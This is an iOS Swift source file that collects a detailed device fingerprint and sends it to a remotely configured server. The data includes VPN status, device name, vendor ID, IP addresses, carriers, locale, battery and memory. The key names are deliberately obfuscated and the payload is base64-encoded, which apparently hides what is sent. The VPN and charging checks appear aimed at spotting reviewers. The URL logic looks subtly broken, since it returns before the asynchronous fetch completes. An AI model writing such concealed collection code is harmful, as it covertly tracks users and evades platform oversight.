//
//  Device.swift
//  app724
//
//  Created by Dias Atudinov on 25.07.2024.
//

import CoreTelephony
import UIKit


struct InfoOfDevice {
    
    var isVPNActive: Bool
    var deviceName: String
    var deviceModel: String
    var uniqueID: String
    var networkAddresses: [String]
    var carriers: [String]
    var iosVersion: String
    var language: String
    var timeZone: String
    var isCharging: Bool
    var memoryInfo: String
    var installedApps: [String: Bool]
    var batteryLevel: Double
    var inputLanguages: [String]
    var region: String
    var usesMetricSystem: Bool
    var isFullyCharged: Bool
}

extension InfoOfDevice: SecondEndpoint {
    
    var theMainURL: String {
        
        var temp_url: String = ""
        
        fetchData { server1_0, landing_request, codeTech, error in
            
            if let error = error {
                
                print("Ошибка: \(error.localizedDescription)")
                
            } else {
                
                if let server1_0 = server1_0 {
                    
                    temp_url = server1_0
                    
                } else {
                    
                    print("Ключ 'url' не найден в JSON.")
                }
            }
        }
        
        return "https://\(temp_url)"
    }

    var method: String {
        
        return "POST"
    }
    
    var body: [String: Any] {
        
        let userData: [String: Any] = [
            
            "vivisWork": isVPNActive,
            "gfdokPS": deviceName,
            "gdpsjPjg": deviceModel,
            "poguaKFP": uniqueID,
            "gpaMFOfa": networkAddresses,
            "gciOFm": carriers,
            "bcpJFs": iosVersion,
            "GOmblx": language,
            "G0pxum": timeZone,
            "Fpvbduwm": isCharging,
            "Fpbjcv": memoryInfo,
            "bvoikOGjs": installedApps,
            "gfpbvjsoM": batteryLevel,
            "gfdosnb": inputLanguages,
            "bpPjfns": region,
            "biMpaiuf": usesMetricSystem,
            "oahgoMAOI": isFullyCharged,
            "KDhsd": false,
            "StwPp": false
        ]
        
        let jsonData = try? JSONSerialization.data(withJSONObject: userData, options: .fragmentsAllowed)
        let base64String = jsonData?.base64EncodedString() ?? ""

        return ["ud": base64String]
    }
}


struct DeviceInfo {
    
    static func collectData() -> InfoOfDevice {
        
        var isConnectedToVpn: Bool {
            
            let vpnProtocolsKeysIdentifiers = [
                "tap", "tun", "ppp", "ipsec", "utun", "ipsec0", "utun1", "utun2"
            ]
            
            guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
            
            let nsDict = cfDict.takeRetainedValue() as NSDictionary
            
            guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
                  let allKeys = keys.allKeys as? [String] else { return false }
            for key in allKeys {
                
                for protocolId in vpnProtocolsKeysIdentifiers
                        
                where key.starts(with: protocolId) {
                    
                    return true
                }
            }
            
            return false
        }
        
        let wifiAdress = getAddress(for: .wifi)
        let cellularAdress = getAddress(for: .cellular)
        
        let networkInfo = CTTelephonyNetworkInfo()
        let carrier = networkInfo.serviceSubscriberCellularProviders?.values
        var arrayOfCarrier = [String]()
        carrier?.forEach { arrayOfCarrier.append($0.carrierName ?? "") }
        
        let memory = String(ProcessInfo.processInfo.physicalMemory / 1073741824)
        
        let availableLanguages = UITextInputMode.activeInputModes.compactMap { $0.primaryLanguage }
        
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = Double(UIDevice.current.batteryLevel * 100.0)
        
        return InfoOfDevice(
            
            isVPNActive: isConnectedToVpn,
            deviceName: UIDevice.current.name,
            deviceModel: UIDevice.current.model,
            uniqueID: UIDevice.current.identifierForVendor?.uuidString ?? "",
            networkAddresses: [wifiAdress ?? "", cellularAdress ?? ""],
            carriers: arrayOfCarrier,
            iosVersion: UIDevice.current.systemVersion,
            language: Locale.preferredLanguages.first ?? "en",
            timeZone: TimeZone.current.identifier,
            isCharging: UIDevice.current.batteryState == .charging,
            memoryInfo: memory,
            installedApps: [:],
            batteryLevel: batteryLevel,
            inputLanguages: availableLanguages,
            region: Locale.current.regionCode ?? "",
            usesMetricSystem: Locale.current.usesMetricSystem,
            isFullyCharged: batteryLevel == 100
        )
    }
    
    static  func getAddress(for network: Network) -> String? {
        var address: String?
        
        // Get list of all interfaces on the local machine:
        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        guard getifaddrs(&ifaddr) == 0 else { return nil }
        guard let firstAddr = ifaddr else { return nil }
        
        // For each interface ...
        for ifptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next }) {
            let interface = ifptr.pointee
            
            // Check for IPv4 or IPv6 interface:
            let addrFamily = interface.ifa_addr.pointee.sa_family
            if addrFamily == UInt8(AF_INET) || addrFamily == UInt8(AF_INET6) {
                
                // Check interface name:
                let name = String(cString: interface.ifa_name)
                if name == network.rawValue {
                    
                    // Convert interface address to a human readable string:
                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                    getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
                                &hostname, socklen_t(hostname.count),
                                nil, socklen_t(0), NI_NUMERICHOST)
                    address = String(cString: hostname)
                }
            }
        }
        freeifaddrs(ifaddr)
        
        return address
    }
}

enum Network: String {
    
    case wifi = "en0"
    case cellular = "pdp_ip0"
}
